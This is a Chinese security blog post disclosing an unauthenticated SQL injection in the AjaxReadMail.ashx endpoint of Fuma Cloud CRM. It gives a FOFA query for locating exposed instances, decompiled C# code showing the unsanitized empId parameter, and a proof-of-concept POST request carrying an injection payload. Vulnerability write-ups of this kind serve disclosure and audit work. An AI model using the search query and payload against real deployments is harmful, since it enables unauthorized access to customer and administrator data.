---
title: "孚盟云CRM AjaxReadMail.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxReadMail-sqli.html
asset_dir: assets/孚盟云crm-ajaxreadmail.ashx-sql注入漏洞
---

# 孚盟云CRM AjaxReadMail.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/1/26 08:31
* 245浏览
* [0评论](#comment)
* 13分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

上海孚盟软件有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云AjaxReadMail.ashx接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

客户关系管理

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

直接看 `AjaxReadMail.ashx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 **AjaxReadMail** 方法的实现如下

```
string str3 = context.Request["method"].ToString();
string empty8 = string.Empty;
string empty9 = string.Empty;
string s = str3;
switch (\u003CPrivateImplementationDetails\u003E.ComputeStringHash(s))
{
...
if (!string.op_Equality(s, "getHeadImage"))
  break;
try
{
  string empPic = new VTSupport().GetEmpPic(context.Request["empId"] == null ? "" : context.Request["empId"].ToString());
  context.Response.Write(empPic);
  break;
}
```

当**method=GetEmpPic**时，进入`GetEmpPic`方法

```
public string GetEmpPic(string empId)
{
  DataTable table = this.dbHelper.Query($"select * from bfEmp where EmpID='{empId}' ").Tables[0];
  return this.getEmpPicHtml(table.Rows[0]["HeadPic"].ToString(), table.Rows[0]["CNEmpName"].ToString(), empId);
}
```

参数`empID`被直接拼接进SQL语句中执行，期间无过滤或校验，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

downLoadAttachFiles方法也存在同样的拼接导致的SQL注入漏洞。

SQL注入检测工具

[![孚盟云CRM AjaxReadMail.ashx SQL注入漏洞](images/img-001-38e0825910cd.webp)](https://image.mrxn.net/e2f05fd51dd04eef973c217283816d22.webp)

# 漏洞复现

```
POST /m/Dingding/Ajax/AjaxReadMail.ashx HTTP/1.1
Host: fumacrm.mrxn.net
Cookie: UserCookie={"empId":"1","corpId": "1"}
Content-Type: application/x-www-form-urlencoded

method=getHeadImage&empId='SQLI_POC--
```

[![孚盟云CRM AjaxReadMail.ashx SQL注入漏洞](images/img-002-08476d09d510.webp)](https://image.mrxn.net/5983c0df0d5a48f182b14f3c51b59283.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[孚盟云CRM AjaxReadMail.ashx SQL注入漏洞](https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxReadMail-sqli.html)  
文章链接：<https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxReadMail-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

代码安全审计

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxReadMail-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞扫描服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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